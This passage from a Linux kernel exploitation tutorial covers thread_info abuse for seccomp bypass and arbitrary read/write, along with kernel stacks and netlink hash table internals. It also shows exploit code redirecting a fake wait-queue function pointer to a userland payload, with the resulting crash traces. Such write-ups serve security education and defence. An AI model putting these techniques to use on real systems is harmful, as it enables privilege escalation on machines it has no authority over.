memory directly from userland will provoke a page\nfault that will kill your exploit (SIGSEGV) because the running level\nis still CPL=3 (see the \"page fault\" section).\nSince, we want read\/write kernel memory from userland, we can actually\nask the kernel to do it for us through a syscall that calls\ncopy_{to|from}_user() function while providing a kernel pointer in\n\"__user\" marked parameter.\nFinal note about thread_info\nAs you might notice by the three examples shown here, the thread_info\nstructure is of utter importance in general as well as for exploitation\nscenarios. We showed that:\n1. While leaking a kernel thread stack pointer, we can retrieve a\npointer to the current task_struct (hence lots of kernel data\nstructures)\n2. By overwriting the flags field we can disable seccomp protection\nand eventually escape some sandboxes\n3. We can gain an arbitrary read\/write primitive by changing the value\nof the addr_limit field\nThose are just a sample of things you can do with thread_info. This is\na small but critical structure.\nVirtual Memory Map\nIn the previous section, we saw that the \"highest\" valid userland\naddress was:\n#define TASK_SIZE_MAX   ((1UL << 47) - PAGE_SIZE) \/\/ == 0x00007ffffffff000\nOne might wonder where does this \"47\" comes from?\nIn the early AMD64 architecture, designers thought that addressing 2^64\nmemory is somehow \"too big\" and force to add another level of page\ntable (performance hit). For this reason, it has been decided that only\nthe lowest 48-bits of an address should be used to translate a virtual\naddress into a physical address.\nHowever, if the userland address space ranges from 0x0000000000000000\nto 0x00007ffffffff000 what will the kernel address space ? The answer\nis: 0xffff800000000000 to 0xffffffffffffffff.\nThat is, the bits [48:63] are:\n* all cleared for user addresses\n* all set for kernel addresses\nMore specifically, AMD imposed that those [48:63] are the same as the\n47 bit. Otherwise, an exception is thrown. Addresses respecting this\nconvention are called canonical form addresses. With such model, it is\nstill possible to address 256TB of memory (half for user, half for\nkernel).\nThe space between 0x00007ffffffff000 and 0xffff800000000000 are unused\nmemory addresses (also called \"non-canonical addresses\"). That is, the\nvirtual memory layout for a 64-bit process is:\nVirtual Memory Map virtual_memory_map.png\nThe above diagram is the \"big picture\". You can get a more precise\nvirtual memory map in the Linux kernel documentation:\nDocumentation\/x86\/x86_64\/mm.txt.\nNOTE: The \"guard hole\" address range is needed by some hypervisor (e.g.\nXen).\nIn the end, when you see an address starting with \"0xffff8*\" or higher,\nyou can be sure that it is a kernel one.\nKernel Thread Stacks\nIn Linux (x86-64 architecture), there are two kinds of kernel stacks:\n* thread stacks: 16k-bytes stacks for every active thread\n* specialized stacks: a set of per-cpu stacks used in special\noperations\nYou may want to read the Linux kernel documentation for\nadditional\/complementary information:\nDocumentation\/x86\/x86_64\/kernel-stacks.\nFirst, let's describe the thread stacks. When a new thread is created\n(i.e. a new task_struct), the kernel does a \"fork-like\" operation by\ncalling copy_process(). The later allocates a new task_struct\n(remember, there is one task_struct per thread) and copies most of the\nparent's task_struct into the new one.\nHowever, depending on how the task is created, some resources can be\neither shared (e.g. memory is shared in a multithreaded application) or\n\"copied\" (e.g. the libc's data). In the later case, if the thread\nmodified some data a new separated version is created: this is called\ncopy-on-write (i.e. it impacts only the current thread and not every\nthread importing the libc).\nIn other words, a process is never created \"from scratch\" but starts by\nbeing a copy of its parent process (be it init). The \"differences\" are\nfixed later on.\nFurthermore, there is some thread specific data, one of them being the\nkernel thread stack. During the creation\/duplication process,\ndup_task_struct() is called very early:\nstatic struct task_struct *dup_task_struct(struct task_struct *orig)\n{\nstruct task_struct *tsk;\nstruct thread_info *ti;\nunsigned long *stackend;\nint node = tsk_fork_get_node(orig);\nint err;\nprepare_to_copy(orig);\n[0]     tsk = alloc_task_struct_node(node);\nif (!tsk)\nreturn NULL;\n[1]     ti = alloc_thread_info_node(tsk, node);\nif (!ti) {\nfree_task_struct(tsk);\nreturn NULL;\n}\n[2]     err = arch_dup_task_struct(tsk, orig);\nif (err)\ngoto out;\n[3]     tsk->stack = ti;\n\/\/ ... cut ...\n[4]     setup_thread_stack(tsk, orig);\n\/\/ ... cut ...\n}\n#define THREAD_ORDER  2\n#define alloc_thread_info_node(tsk, node)             \\\n({                                    \\\nstruct page *page = alloc_pages_node(node, THREAD_FLAGS,    \\\nTHREAD_ORDER);     \\\nstruct thread_info *ret = page ? page_address(page) : NULL; \\\n\\\nret;                                \\\n})\nThe previous code does the following:\n* [0]: allocates a new struct task_struct using the Slab allocator\n* [1]: allocates a new thread stack using the Buddy allocator\n* [2]: copies the orig task_struct content to the new tsk task_struct\n(differences will be fixed later on)\n* [3]: changes the task_struct's stack pointer to ti. The new thread\nhas now its dedicated thread stack and its own thread_info\n* [4]: copies the content of orig's thread_info to the new tsk's\nthread_info and fixes the task field.\nOne might be confused with [1]. The macro alloc_thread_info_node() is\nsupposed to allocate a struct thread_info and yet, it allocates a\nthread stack. The reason being thread_info structures lives in thread\nstacks:\n#define THREAD_SIZE  (PAGE_SIZE << THREAD_ORDER)\nunion thread_union {                                \/\/ <----- this is an \"union\"\nstruct thread_info thread_info;\nunsigned long stack[THREAD_SIZE\/sizeof(long)];  \/\/ <----- 16k-bytes\n};\nExcept for the init process, thread_union is not used anymore (on\nx86-64) but the layout is still the same:\nThread Stack Layout thread_stack.png\nNOTE: The KERNEL_STACK_OFFSET exists for \"optimization reasons\" (avoid\na sub operation in some cases). You can ignore it for now.\nThe STACK_END_MAGIC is here to mitigate kernel thread stack overflow\nexploitation. As explained earlier, overwriting thread_info data can\nlead to nasty things (it also holds function pointers in the\nrestart_block field).\nSince thread_info is at the top of this region, you hopefully\nunderstand now why, by masking out THREAD_SIZE, you can retrieve the\nthread_info address from any kernel thread stack pointer.\nIn the previous diagram, one might notice the kernel_stack pointer.\nThis is a \"per-cpu\" variable (i.e. one for each cpu) declared here:\n\/\/ [arch\/x86\/kernel\/cpu\/common.c]\nDEFINE_PER_CPU(unsigned long, kernel_stack) =\n(unsigned long)&init_thread_union - KERNEL_STACK_OFFSET + THREAD_SIZE;\nInitially, kernel_stack points to the init thread stack (i.e.\ninit_thread_union). However, during a [38]Context Switch, this\n(per-cpu) variable is updated:\n#define task_stack_page(task)   ((task)->stack)\n__switch_to(struct task_struct *prev_p, struct task_struct *next_p)\n{\n\/\/ ... cut ..\npercpu_write(kernel_stack,\n(unsigned long)task_stack_page(next_p) +\nTHREAD_SIZE - KERNEL_STACK_OFFSET);\n\/\/ ... cut ..\n}\nIn the end, the current thread_info is retrieved with:\nstatic inline struct thread_info *current_thread_info(void)\n{\nstruct thread_info *ti;\nti = (void *)(percpu_read_stable(kernel_stack) +\nKERNEL_STACK_OFFSET - THREAD_SIZE);\nreturn ti;\n}\nThe kernel_stack pointer is used while entering a system call. It\nreplaces the current (userland) rsp which is restored while exiting\nsystem call.\nUnderstanding Netlink Data Structures\nLet's have a closer look to netlink data structures. This will help us\nunderstand where and what are the dangling pointers we are trying to\nrepair.\nNetlink has a \"global\" array nl_table of type netlink_table:\n\/\/ [net\/netlink\/af_netlink.c]\nstruct netlink_table {\nstruct nl_pid_hash hash;        \/\/ <----- we will focus on this\nstruct hlist_head mc_list;\nunsigned long *listeners;\nunsigned int nl_nonroot;\nunsigned int groups;\nstruct mutex *cb_mutex;\nstruct module *module;\nint registered;\n};\nstatic struct netlink_table *nl_table;  \/\/ <----- the \"global\" array\nThe nl_table array is initialized at boot-time with\nnetlink_proto_init():\n\/\/ [include\/linux\/netlink.h]\n#define NETLINK_ROUTE       0   \/* Routing\/device hook              *\/\n#define NETLINK_UNUSED      1   \/* Unused number                *\/\n#define NETLINK_USERSOCK    2   \/* Reserved for user mode socket protocols  *\/\n\/\/ ... cut ...\n#define MAX_LINKS 32\n\/\/ [net\/netlink\/af_netlink.c]\nstatic int __init netlink_proto_init(void)\n{\n\/\/ ... cut ...\nnl_table = kcalloc(MAX_LINKS, sizeof(*nl_table), GFP_KERNEL);\n\/\/ ... cut ...\n}\nIn other words, there is one netlink_table per protocol\n(NETLINK_USERSOCK being one of them). Furthermore, each of those\nnetlink tables embedded a hash field of type struct nl_pid_hash:\n\/\/ [net\/netlink\/af_netlink.c]\nstruct nl_pid_hash {\nstruct hlist_head *table;\nunsigned long rehash_time;\nunsigned int mask;\nunsigned int shift;\nunsigned int entries;\nunsigned int max_shift;\nu32 rnd;\n};\nThis structure is used to manipulate a netlink hash table. To that\nmeans the following fields are used:\n* table: an array of struct hlist_head, the actual hash table\n* reshash_time: used to reduce the number of \"dilution\" over time\n* mask: number of buckets (minus 1), hence mask the result of the\nhash function\n* shift: a number of bits (i.e. order) used to compute an \"average\"\nnumber of elements (i.e. the load factor). Incidentally, represents\nthe number of time the table has grown.\n* entries: total numbers of element in the hash table\n* max_shift: a number of bits (i.e. order). The maximum amount of\ntime the table can grow, hence the maximum number of buckets\n* rnd: a random number used by the hash function\nBefore going back to the netlink hash table implementation, let's have\nan overview of the hash table API in Linux.\nLinux Hash Table API\nThe hash table itself is manipulated with other typical Linux data\nstructures: struct hlist_head and struct hlist_node. Unlike struct\nlist_head (cf. \"Core Concept #3\") which just uses the same type to\nrepresent either the list head and the elements, the hash list uses two\ntypes defined here:\n\/\/ [include\/linux\/list.h]\n\/*\n* Double linked lists with a single pointer list head.\n* Mostly useful for hash tables where the two pointer list head is\n* too wasteful.\n* You lose the ability to access the tail in O(1).       \/\/ <----- this\n*\/\nstruct hlist_head {\nstruct hlist_node *first;\n};\nstruct hlist_node {\nstruct hlist_node *next, **pprev; \/\/ <----- note the \"pprev\" type (pointer o\nf pointer)\n};\nSo, the hash table is composed of one or multiple buckets. Each element\nin a given bucket is in a non-circular doubly linked list. It means:\n* the last element in a bucket's list points to NULL\n* the first element's pprev pointer in the bucket list points to the\nhlist_head's first pointer (hence the pointer of pointer).\nThe bucket itself is represented with a hlist_head which has a single\npointer. In other words, we can't access the tail from a bucket's head.\nWe need to walk the whole list (cf. the commentary).\nIn the end, a typical hash table looks like this:\nTypical Hashtable typical_hashtable.png\nYou may want to check this [39]FAQ (from kernelnewbies.org) for a usage\nexample (just like we did with list_head in \"Core Concept #3\").\nNetlink Hash Tables Initialization\nLet's get back to the netlink's hash tables initialization code which\ncan be split in two parts.\nFirst, an order value is computed based on the totalram_pages global\nvariable. The later is computed during boot-time and, as the name\nsuggested, (roughly) represents the number of page frames available in\nRAM. For instance, on a 512MB system, the max_shift will be something\nlike 16 (i.e. 65k buckets per hash table).\nSecondly, a distinct hash table is created for every netlink protocol:\nstatic int __init netlink_proto_init(void)\n{\n\/\/ ... cut ...\nfor (i = 0; i < MAX_LINKS; i++) {\nstruct nl_pid_hash *hash = &nl_table[i].hash;\n[0]       hash->table = nl_pid_hash_zalloc(1 * sizeof(*hash->table));\nif (!hash->table) {\n\/\/ ... cut (free everything and panic!) ...\n}\nhash->max_shift = order;\nhash->shift = 0;\n[1]       hash->mask = 0;\nhash->rehash_time = jiffies;\n}\n\/\/ ... cut ...\n}\nIn [0], the hash table is allocated with a single bucket. Hence the\nmask is set to zero in [1] (number of buckets minus one). Remember, the\nfield hash->table is an array of struct hlist_head, each pointing to a\nbucket list head.\nBasic Netlink Hash Table Insertion\nAlright, now we know the initial state of netlink hash tables (only one\nbucket), let's study the insertion algorithm which starts in\nnetlink_insert(). In this section, we will only consider the \"basic\"\ncase (i.e. discard the \"dilute\" mechanism).\nThe purpose of netlink_insert() is to insert a sock's hlist_node into a\nhash table using the provided pid in argument. A pid can only appear\nonce per hash table.\nFirst, let's study the beginning of the netlink_insert() code:\nstatic int netlink_insert(struct sock *sk, struct net *net, u32 pid)\n{\n[0]     struct nl_pid_hash *hash = &nl_table[sk->sk_protocol].hash;\nstruct hlist_head *head;\nint err = -EADDRINUSE;\nstruct sock *osk;\nstruct hlist_node *node;\nint len;\n[1a]    netlink_table_grab();\n[2]     head = nl_pid_hashfn(hash, pid);\nlen = 0;\n[3]     sk_for_each(osk, node, head) {\n[4]       if (net_eq(sock_net(osk), net) && (nlk_sk(osk)->pid == pid))\nbreak;\nlen++;\n}\n[5]     if (node)\ngoto err;\n\/\/ ... cut ...\nerr:\n[1b]    netlink_table_ungrab();\nreturn err;\n}\nThe previous code does:\n* [0]: retrieve the nl_pid_hash (i.e hash table) for the given\nprotocol (e.g. NETLINK_USERSOCK)\n* [1a]: protect access to all netlink hash tables with a lock\n* [2]: retrieve a pointer to a bucket (i.e. a hlist_head) using the\n_pid argument as a key of the hash function\n* [3]: walk the bucket's doubly linked-list and...\n* [4]: ... check for collision on the pid\n* [5]: if the pid was found in the bucket's list (node is not NULL),\njump to err. It will return a -EADDRINUSE error.\n* [1b]: release the netlink hash tables lock\nExcept [2], this is pretty straightforward: find the proper bucket and\nscan it to check if the pid does not already exist.\nNext comes a bunch of sanity checks:\nerr = -EBUSY;\n[6]     if (nlk_sk(sk)->pid)\ngoto err;\nerr = -ENOMEM;\n[7]     if (BITS_PER_LONG > 32 && unlikely(hash->entries >= UINT_MAX))\ngoto err;\nIn [6], the netlink_insert() code makes sure that the sock being\ninserted in the hash table does not already have a pid set. In other\nwords, it checks that it hasn't already been inserted into the hash\ntable. The check at [7] is simply a hard limit. A Netlink hash table\ncan't have more than 4 Giga elements (that's still a lot!).\nFinally:\n[8]     if (len && nl_pid_hash_dilute(hash, len))\n[9]       head = nl_pid_hashfn(hash, pid);\n[10]    hash->entries++;\n[11]    nlk_sk(sk)->pid = pid;\n[12]    sk_add_node(sk, head);\n[13]    err = 0;\nWhich does:\n* [8]: if the current bucket has at least one element, calls\nnl_pid_hash_dilute() (cf. next section)\n* [9]: if the hash table has been diluted, find the new bucket\npointer (hlist_head)\n* [10]: increase the total number of elements in the hash table\n* [11]: set the sock's pid field\n* [12]: add the sock's hlist_node into the doubly-linked bucket's\nlist\n* [13]: reset err since netlink_insert() succeeds\nBefore going further, let's see a couple of things. If we unroll\nsk_add_node(), we can see that:\n* it takes a reference on the sock (i.e. increase the refcounter)\n* it calls hlist_add_head(&sk->sk_node, list)\nIn other words, when a sock is inserted into a hash table, it is always\ninserted at the head of a bucket. We will use this property later on,\nkeep this in mind.\nFinally, let's look at the hash function:\nstatic struct hlist_head *nl_pid_hashfn(struct nl_pid_hash *hash, u32 pid)\n{\nreturn &hash->table[jhash_1word(pid, hash->rnd) & hash->mask];\n}\nAs expected, this function is just about computing the bucket index of\nthe hash->table array which is wrapped using the mask field of the hash\ntable and return the hlist_head pointer representing the bucket.\nThe hash function itself being jhash_1word() which is the Linux\nimplementation of the [40]Jenkins hash function. It is not required to\nunderstand the implementation but note that it uses two \"keys\" (pid and\nhash->rnd) and assume this is not \"reversible\".\nOne might have noticed that without the \"dilute\" mechanism, the hash\ntable actually never extends. Since it is initialized with one bucket,\nelements are simply stored in a single doubly-linked list... pretty\nuseless utilization of hash tables!\nThe Netlink Hash Table \"Dilution\" Mechanism\nAs stated above, by the end of netlink_insert() the code calls\nnl_pid_hash_dilute() if len is not zero (i.e. the bucket is not empty).\nIf the \"dilution\" succeeds, it searches a new bucket to add the sock\nelement (the hash table has been \"rehashed\"):\nif (len && nl_pid_hash_dilute(hash, len))\nhead = nl_pid_hashfn(hash, pid);\nLet's check the implementation:\nstatic inline int nl_pid_hash_dilute(struct nl_pid_hash *hash, int len)\n{\n[0]     int avg = hash->entries >> hash->shift;\n[1]     if (unlikely(avg > 1) && nl_pid_hash_rehash(hash, 1))\nreturn 1;\n[2]     if (unlikely(len > avg) && time_after(jiffies, hash->rehash_time)) {\nnl_pid_hash_rehash(hash, 0);\nreturn 1;\n}\n[3]     return 0;\n}\nFundamentally, what this function is trying to do is:\n1. it makes sure there are \"enough\" buckets in the hash table to\nminimize collision, otherwise try to grow the hash table\n2. it keeps all buckets balanced\nAs we will see in the next section, when the hash table \"grows\", the\nnumber of buckets is multiplied by two. Because of this, the expression\nat [0], is equivalent to:\navg = nb_elements \/ (2^(shift))     <===>     avg = nb_elements \/ nb_buckets\nIt computes the load factor of the hash table.\nThe check at [1] is true when the average number of elements per bucket\nis greater or equal to 2. In other words, the hash table has \"on\naverage\" two elements per bucket. If a third element is about to be\nadded, the hash table is expanded and then diluted through \"rehashing\".\nThe check at [2] is kinda similar to [1], the difference being that the\nhash table isn't expanded. Since len is greater than avg which is\ngreater than 1, when trying to add a third element into a bucket, the\nwhole hash table is again diluted and \"rehashed\". On the other hand, if\nthe table is mostly empty (i.e. avg equals zero), then trying to add\ninto a non-empty bucket (len > 0) provokes a \"dilution\". Since this\noperation is costly (O(N)) and can happen at every insertion under\ncertain circumstance (e.g. can't grow anymore), its occurrence is\nlimited with rehash_time.\nNOTE: jiffies is a measure of time, see [41]Kernel Timer Systems.\nIn the end, the way netlink stores elements in its hash tables is a 1:2\nmapping on average. The only exception is when the hash table can't\ngrow anymore. In that case, it slowly becomes a 1:3, 1:4 mapping, etc.\nReaching this point means that there are more than 128k netlink sockets\nor so. From the exploiter point of view, chances are that you will be\nlimited by the number of opened file descriptors before reaching this\npoint.\nNetlink \"Rehashing\"\nIn order to finish our understanding of the netlink hash table\ninsertion, let's quickly review nl_pid_hash_rehash():\nstatic int nl_pid_hash_rehash(struct nl_pid_hash *hash, int grow)\n{\nunsigned int omask, mask, shift;\nsize_t osize, size;\nstruct hlist_head *otable, *table;\nint i;\nomask = mask = hash->mask;\nosize = size = (mask + 1) * sizeof(*table);\nshift = hash->shift;\nif (grow) {\nif (++shift > hash->max_shift)\nreturn 0;\nmask = mask * 2 + 1;\nsize *= 2;\n}\ntable = nl_pid_hash_zalloc(size);\nif (!table)\nreturn 0;\notable = hash->table;\nhash->table = table;\nhash->mask = mask;\nhash->shift = shift;\nget_random_bytes(&hash->rnd, sizeof(hash->rnd));\nfor (i = 0; i <= omask; i++) {\nstruct sock *sk;\nstruct hlist_node *node, *tmp;\nsk_for_each_safe(sk, node, tmp, &otable[i])\n__sk_add_node(sk, nl_pid_hashfn(hash, nlk_sk(sk)->pid));\n}\nnl_pid_hash_free(otable, osize);\nhash->rehash_time = jiffies + 10 * 60 * HZ;\nreturn 1;\n}\nThis function:\n1. is based on the grow parameter and computes a new size and mask.\nThe number of buckets is multiplied by two at each growing\noperation\n2. allocates a new array of hlist_head (i.e. new buckets)\n3. updates the rnd value of the hash table. It means that the whole\nhash table is broken now because the hash function won't allow to\nretrieve the previous elements\n4. walks the previous buckets and re-insert all elements into the new\nbuckets using the new hash function\n5. releases the previous bucket array and updates the rehash_time.\nSince the hash function has changed, that is why the \"new bucket\" is\nrecomputed after dilution prior to inserting the element (in\nnetlink_insert()).\nNetlink Hash Table Summary\nLet's sum up what we know about netlink hash table insertion so far:\n* netlink has one hash table per protocol\n* each hash table starts with a single bucket\n* there is on average two elements per bucket\n* the table grows when there are (roughly) more than two elements per\nbucket\n* every time a hash table grows, its number of buckets is multiplied\nby two\n* when the hash table grows, its elements are \"diluted\"\n* while inserting an element into a bucket \"more charged\" than\nothers, it provokes a dilution\n* elements are always inserted at the head of a bucket\n* when a dilution occurs, the hash function changed\n* the hash function uses a user-provided pid value and another\nunpredictable key\n* the hash function is supposed to be irreversible so we can't choose\ninto which bucket an element will be inserted\n* any operation on ANY hash table is protected by a global lock\n(netlink_table_grab() and netlink_table_ungrab())\nAnd some additional elements about removal (check netlink_remove()):\n* once grown, a hash table is never shrinked\n* a removal never provokes a dilution\nALRIGHT! We are ready to move on and get back to our exploit!\n__________________________________________________________________\nMeeting Supervisor Mode Execution Prevention\nIn the previous article, we modified the PoC to exploit the\nuse-after-free through type confusion [1]. With the reallocation we\nmade the \"fake\" netlink sock's wait queue pointing to an element in\nuserland [2].\nThen, the setsockopt() syscall [3a] iterates over our userland wait\nqueue element and calls the func function pointer [3b] that is panic()\n[3c] right now. This gave us a nice call trace to validate that we\nsuccessfully achieved an arbitrary call.\narbitrary call Panic() arbitrary_call_0.png\nThe call trace was something like:\n[  213.352742] Freeing alive netlink socket ffff88001bddb400\n[  218.355229] Kernel panic - not syncing: ^A\n[  218.355434] Pid: 2443, comm: exploit Not tainted 2.6.32\n[  218.355583] Call Trace:\n[  218.355689]  [<ffffffff8155372b>] ? panic+0xa7\/0x179\n[  218.355927]  [<ffffffff810665b3>] ? __wake_up+0x53\/0x70\n[  218.356045]  [<ffffffff81061909>] ? __wake_up_common+0x59\/0x90\n[  218.356156]  [<ffffffff810665a8>] ? __wake_up+0x48\/0x70\n[  218.356310]  [<ffffffff814b81cc>] ? netlink_setsockopt+0x13c\/0x1c0\n[  218.356460]  [<ffffffff81475a2f>] ? sys_setsockopt+0x6f\/0xc0\n[  218.356622]  [<ffffffff8100b1a2>] ? system_call_fastpath+0x16\/0x1b\nAs we can see panic() is indeed called from the curr->func() function\npointer in __wake_up_common().\nNOTE: the second call to __wake_up() does not occur. It appears here\nbecause the arguments of panic() are a bit broken.\nReturning to userland code (first try)\nAlright, now let's try to return into userland (some call it\nret-to-user).\nOne might ask: why returning into userland code? Except if your kernel\nis backdoored, it is unlikely that you will find a single function that\ndirectly elevates your privileges, repair the kernel, etc. We want to\nexecute arbitrary code of our choice. Since we have an arbitrary call\nprimitive, let's write our payload in the exploit and jump to it.\nLet's modify the exploit and build a payload() function that in turn\nwill call panic() (for testing purpose). Remember to change the func\nfunction pointer value:\nstatic int payload(void);\nstatic int init_realloc_data(void)\n{\n\/\/ ... cut ...\n\/\/ initialise the userland wait queue element\nBUILD_BUG_ON(offsetof(struct wait_queue, func) != WQ_ELMT_FUNC_OFFSET);\nBUILD_BUG_ON(offsetof(struct wait_queue, task_list) != WQ_ELMT_TASK_LIST_OFFSE\nT);\ng_uland_wq_elt.flags = WQ_FLAG_EXCLUSIVE; \/\/ set to exit after the first arbit\nrary call\ng_uland_wq_elt.private = NULL; \/\/ unused\ng_uland_wq_elt.func = (wait_queue_func_t) &payload; \/\/ <----- userland addr in\nstead of PANIC_ADDR\ng_uland_wq_elt.task_list.next = (struct list_head*)&g_fake_next_elt;\ng_uland_wq_elt.task_list.prev = (struct list_head*)&g_fake_next_elt;\nprintf(\"[+] g_uland_wq_elt addr = %p\\n\", &g_uland_wq_elt);\nprintf(\"[+] g_uland_wq_elt.func = %p\\n\", g_uland_wq_elt.func);\nreturn 0;\n}\ntypedef void (*panic)(const char *fmt, ...);\n\/\/ The following code is executed in Kernel Mode.\nstatic int payload(void)\n{\n((panic)(PANIC_ADDR))(\"\");  \/\/ called from kernel land\n\/\/ need to be different than zero to exit list_for_each_entry_safe() loop\nreturn 555;\n}\nThe previous diagram becomes:\nArbitrary call panic() from userland arbitrary_call_1.png\nTry to launch it, and...\n[  124.962677] BUG: unable to handle kernel paging request at 00000000004014c4\n[  124.962923] IP: [<00000000004014c4>] 0x4014c4\n[  124.963039] PGD 1e3df067 PUD 1abb6067 PMD 1b1e6067 PTE 111e3025\n[  124.963261] Oops: 0011 [#1] SMP\n...\n[  124.966733] RIP: 0010:[<00000000004014c4>]  [<00000000004014c4>] 0x4014c4\n[  124.966810] RSP: 0018:ffff88001b533e60  EFLAGS: 00010012\n[  124.966851] RAX: 0000000000602880 RBX: 0000000000602898 RCX: 0000000000000000\n[  124.966900] RDX: 0000000000000000 RSI: 0000000000000001 RDI: 0000000000602880\n[  124.966948] RBP: ffff88001b533ea8 R08: 0000000000000000 R09: 00007f919c472700\n[  124.966995] R10: 00007ffd8d9393f0 R11: 0000000000000202 R12: 0000000000000001\n[  124.967043] R13: ffff88001bdf2ab8 R14: 0000000000000000 R15: 0000000000000000\n[  124.967090] FS:  00007f919cc3c700(0000) GS:ffff880003200000(0000) knlGS:00000\n00000000000\n[  124.967141] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033\n[  124.967186] CR2: 00000000004014c4 CR3: 000000001d01a000 CR4: 00000000001407f0\n[  124.967264] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000\n[  124.967334] DR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000000400\n[  124.967385] Process exploit (pid: 2447, threadinfo ffff88001b530000, task fff\nf88001b4cd280)\n[  124.968804] Stack:\n[  124.969510]  ffffffff81061909 ffff88001b533e78 0000000100000001 ffff88001b533\nee8\n[  124.969629] <d> ffff88001bdf2ab0 0000000000000286 0000000000000001 0000000000\n000001\n[  124.970492] <d> 0000000000000000 ffff88001b533ee8 ffffffff810665a8 0000000100\n000000\n[  124.972289] Call Trace:\n[  124.973034]  [<ffffffff81061909>] ? __wake_up_common+0x59\/0x90\n[  124.973898]  [<ffffffff810665a8>] __wake_up+0x48\/0x70\n[  124.975251]  [<ffffffff814b81cc>] netlink_setsockopt+0x13c\/0x1c0\n[  124.976069]  [<ffffffff81475a2f>] sys_setsockopt+0x6f\/0xc0\n[  124.976721]  [<ffffffff8100b1a2>] system_call_fastpath+0x16\/0x1b\n[  124.977382] Code:  Bad RIP value.\n[  124.978107] RIP  [<00000000004014c4>] 0x4014c4\n[  124.978770]  RSP <ffff88001b533e60>\n[  124.979369] CR2: 00000000004014c4\n[  124.979994] Tainting kernel with flag 0x7\n[  124.980573] Pid: 2447, comm: exploit Not tainted 2.6.32\n[  124.981147] Call Trace:\n[  124.981720]  [<ffffffff81083291>] ? add_taint+0x71\/0x80\n[  124.982289]  [<ffffffff81558dd4>] ? oops_end+0x54\/0x100\n[  124.982904]  [<ffffffff810527ab>] ? no_context+0xfb\/0x260\n[  124.983375]  [<ffffffff81052a25>] ? __bad_area_nosemaphore+0x115\/0x1e0\n[  124.983994]  [<ffffffff81052bbe>] ? bad_area_access_error+0x4e\/0x60\n[  124.984445]  [<ffffffff81053172>] ? __do_page_fault+0x282\/0x500\n[  124.985055]  [<ffffffff8106d432>] ? default_wake_function+0x12\/0x20\n[  124.985476]  [<ffffffff81061909>] ? __wake_up_common+0x59\/0x90\n[  124.986020]  [<ffffffff810665b3>] ? __wake_up+0x53\/0x70\n[  124.986449]  [<ffffffff8155adae>] ? do_page_fault+0x3e\/0xa0\n[  124.986957]  [<ffffffff81558055>] ? page_fault+0x25\/0x30                 \/\/ <\n------\n[  124.987366]  [<ffffffff81061909>] ? __wake_up_common+0x59\/0x90\n[  124.987892]  [<ffffffff810665a8>] ? __wake_up+0x48\/0x70\n[  124.988295]  [<ffffffff814b81cc>] ? netlink_setsockopt+0x13c\/0x1c0\n[  124.988781]  [<ffffffff81475a2f>] ? sys_setsockopt+0x6f\/0xc0\n[  124.989231]  [<ffffffff8100b1a2>] ? system_call_fastpath+0x16\/0x1b\n[  124.990091] ---[ end trace 2c697770b8aa7d76 ]---\nOops! As we can see in the call trace, it didn't quite hit the mark\n(the step 3 failed)! We will meet this kind of trace quite a lot, we\nbetter understand how to read it.\nUnderstanding Page Fault Trace\nLet's analyze the previous trace. This kind of trace comes from a page\nfault exception. That is, an exception generated by the CPU itself\n(i.e. hardware) while trying to access memory.\nUnder \"normal\" circumstances, a page fault exception can occur when:\n* the CPU tries to access a page that is not present in RAM (legal\naccess)\n* the access is \"illegal\": writing to read-only page, executing NX\npage, address does not belong to a virtual memory area (VMA), etc.\nWhile being an \"exception\" CPU-wise, this actually occurs quite often\nduring normal program life cycle. For instance, when you allocate\nmemory with mmap(), the kernel does not allocate physical memory until\nyou access it the very first time. This is called Demand Paging. This\nfirst access provokes a page fault, and it is the page fault exception\nhandler that actually allocates a page frame. That's why you can\nvirtually allocate more memory than the actual physical RAM (until you\naccess it).\nThe following diagram (from Understanding the Linux Kernel) shows a\nsimplified version of the page fault exception handler:\nPage Fault Handler page_fault_handler.png\nAs we can see, if an illegal access occurs while being in Kernel Land,\nit can crash the kernel. This is where we are right now.\n[  124.962677] BUG: unable to handle kernel paging request at 00000000004014c4\n[  124.962923] IP: [<00000000004014c4>] 0x4014c4\n[  124.963039] PGD 1e3df067 PUD 1abb6067 PMD 1b1e6067 PTE 111e3025\n[  124.963261] Oops: 0011 [#1] SMP\n...\n[  124.979369] CR2: 00000000004014c4\nThe previous trace has a lot of information explaining the reason of\nthe page fault exception. The CR2 register (same as IP here) holds the\nfaulty address.\nIn our case, the MMU (hardware) failed to access memory address\n0x00000000004014c4 (the payload() address). Because IP also points to\nit, we know that an exception is generated while trying to execute the\ncurr->func() instruction in __wake_up_common():\nFirst, let's focus on the error code which is \"0x11\" in our case. The\nerror code is a 64-bit value where the following bits can be set\/clear:\n\/\/ [arch\/x86\/mm\/fault.c]\n\/*\n* Page fault error code bits:\n*\n*   bit 0 ==    0: no page found   1: protection fault\n*   bit 1 ==    0: read access     1: write access\n*   bit 2 ==    0: kernel-mode access  1: user-mode access\n*   bit 3 ==               1: use of reserved bit detected\n*   bit 4 ==               1: fault was an instruction fetch\n*\/\nenum x86_pf_error_code {\nPF_PROT     =       1 << 0,\nPF_WRITE    =       1 << 1,\nPF_USER     =       1 << 2,\nPF_RSVD     =       1 << 3,\nPF_INSTR    =       1 << 4,\n};\nThat is, our error_code is:\n((PF_PROT | PF_INSTR) & ~PF_WRITE) & ~PF_USER\nIn other words, the page fault occurs:\n* because of a protection fault (PF_PROT is set)\n* during an instruction fetch (PF_INSTR is set)\n* implying a read access (PF_WRITE is clear)\n* in kernel-mode (PF_USER is clear)\nSince the page where the faulty address belongs is present (PF_PROT is\nset), a Page Table Entry (PTE) exists. The later describes two things:\n* Page Frame Number (PFN)\n* Page Flags like access rights, page is present status,\nUser\/Supervisor page, etc.\nIn our case, the PTE value is 0x111e3025:\n[  124.963039] PGD 1e3df067 PUD 1abb6067 PMD 1b1e6067 PTE 111e3025\nIf we mask out the PFN part of this value, we get 0b100101 (0x25).\nLet's code a basic program to extract information from the PTE's flags\nvalue:\n#include <stdio.h>\n#define __PHYSICAL_MASK_SHIFT 46\n#define __PHYSICAL_MASK ((1ULL << __PHYSICAL_MASK_SHIFT) - 1)\n#define PAGE_SIZE 4096ULL\n#define PAGE_MASK (~(PAGE_SIZE - 1))\n#define PHYSICAL_PAGE_MASK (((signed long)PAGE_MASK) & __PHYSICAL_MASK)\n#define PTE_FLAGS_MASK (~PHYSICAL_PAGE_MASK)\nint main(void)\n{\nunsigned long long pte = 0x111e3025;\nunsigned long long pte_flags = pte & PTE_FLAGS_MASK;\nprintf(\"PTE_FLAGS_MASK  = 